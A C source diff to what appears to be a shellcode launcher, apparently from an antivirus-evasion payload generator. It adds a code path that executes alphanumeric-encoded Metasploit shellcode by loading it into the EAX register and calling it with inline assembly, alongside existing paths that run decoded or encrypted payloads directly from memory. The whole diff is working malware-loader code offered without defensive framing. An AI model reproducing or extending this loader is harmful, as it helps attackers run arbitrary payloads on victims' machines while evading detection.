@@ -42,6 +42,9 @@ void exec_shellcode64(unsigned char *shellcode);
 #ifdef UVALUE
 char* ie_download(char* string, char* sh_filename);
 #endif
+#ifdef ASCIIMSF
+void exec_shellcode_ASCIIMSF(unsigned char *shellcode);
+#endif
 
 int main (int argc, char **argv)
 {
@@ -116,13 +119,20 @@ int main (int argc, char **argv)
 		shellcode = decode_shellcode(buffer,shellcode,size);
 	#endif
 	#ifndef ENCRYPT
+	#ifndef ASCIIMSF 
 		#ifdef PRINT_DEBUG
 		printf("exec shellcode without decode_shellcode\n");
 		#endif
 		shellcode = buf;
 	#endif
+	#endif
 	#ifndef X64 
+	#ifndef ASCIIMSF
 		exec_shellcode(shellcode);
+	#endif
+	#ifdef ASCIIMSF
+		exec_shellcode_ASCIIMSF(shellcode);
+	#endif
 	#endif
 	#ifdef X64
 		exec_shellcode64(shellcode);
@@ -257,6 +267,7 @@ unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode,
 }
 
 #ifndef X64
+#ifndef ASCIIMSF
 void exec_shellcode(unsigned char *shellcode)
 {
 	#ifdef PRINT_DEBUG
@@ -270,6 +281,22 @@ void exec_shellcode(unsigned char *shellcode)
 	(int)(*funct)();
 }
 #endif
+#ifdef ASCIIMSF
+void exec_shellcode_ASCIIMSF(unsigned char *shellcode)
+{
+	#ifdef PRINT_DEBUG
+		printf("exec_shellcode_ASCIIMSF\n ");
+		int size=strlen(shellcode);
+		printf("shellcode size: %d\n", size);
+	#endif
+
+	register unsigned char* r asm("eax");
+	r=shellcode;
+	asm("call *%eax;");
+}
+#endif
+#endif
+
 
 #ifdef X64
 void exec_shellcode64(unsigned char *shellcode)
